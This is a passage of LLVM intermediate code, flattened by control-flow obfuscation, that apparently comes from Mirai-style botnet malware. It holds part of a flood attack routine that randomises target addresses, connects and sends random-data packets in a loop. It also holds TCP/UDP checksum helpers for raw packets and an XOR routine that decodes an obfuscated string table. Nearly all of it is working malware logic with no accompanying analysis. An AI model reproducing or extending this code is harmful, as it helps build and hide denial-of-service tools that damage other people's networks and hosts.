  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -1221046690, i32 -602971470
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -602971470, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 -546459339, i32 1531091719
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1531091719, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 1201943219, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 1558322446, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 1546219905, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1431249682, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 1461465728, i32 1318043846
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 1701803620, i32 -766079366
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 -766079366, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 1025494110, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 -1431249682, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 1546219905, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1139454618, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1139454618, label %6
    i32 -1295651107, label %10
    i32 572278754, label %17
    i32 1356642720, label %20
    i32 -169927854, label %24
    i32 515003365, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 -1295651107, i32 1356642720
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 572278754, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 1139454618, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 -169927854, i32 515003365
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 515003365, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 -1250177848, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1250177848, label %23
    i32 2146064104, label %27
    i32 1880963282, label %37
    i32 -1522003850, label %41
    i32 -1628172443, label %48
    i32 1769627616, label %79
    i32 -1072358035, label %84
    i32 2114016657, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 2146064104, i32 1880963282
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 -1250177848, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 -1522003850, i32 -1628172443
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -1628172443, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #7
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 1769627616, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -1072358035, i32 2114016657
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 1769627616, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 1604954713, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1604954713, label %5
    i32 -1862699069, label %9
    i32 -1572382511, label %13
    i32 672074092, label %23
    i32 -852710207, label %27
    i32 578139904, label %39
    i32 857875975, label %47
    i32 1764040655, label %48
    i32 1105751169, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 -1862699069, i32 1105751169
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 -1572382511, i32 672074092
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 1764040655, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 -852710207, i32 578139904
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 857875975, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 857875975, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1764040655, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 1604954713, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 2061534675, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2061534675, label %27
    i32 -1648797013, label %35
    i32 1106050830, label %84
    i32 -637485512, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 -1648797013, i32 -637485512
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 1106050830, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 2061534675, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 1812138741, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1812138741, label %first
    i32 -2109593367, label %12
    i32 1138500176, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 -2109593367, i32 1138500176
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 1138500176, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1581863468, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1581863468, label %4
    i32 499560888, label %11
    i32 -2010700253, label %14
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  %10 = select i1 %9, i32 499560888, i32 -2010700253
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* %3, align 4
  store i32 -1581863468, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  ret i32 %15

loopEnd:                                          ; preds = %11, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  store i32 %14, i32* %.reg2mem
  %15 = load i32, i32* %7, align 4
  store i32 %15, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1495709103, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1495709103, label %first
    i32 -1581510859, label %18
    i32 -1541340297, label %23
    i32 856354084, label %24
    i32 -2086612601, label %25
    i32 -1591670033, label %30
    i32 -685034734, label %41
    i32 1541303439, label %42
    i32 1932898934, label %43
    i32 -1820266300, label %44
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %16 = icmp slt i32 %.reload, %.reload3
  %17 = select i1 %16, i32 -1541340297, i32 -1581510859
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 -1541340297, i32 856354084
  store i32 %22, i32* %switchVar
  br label %loopEnd
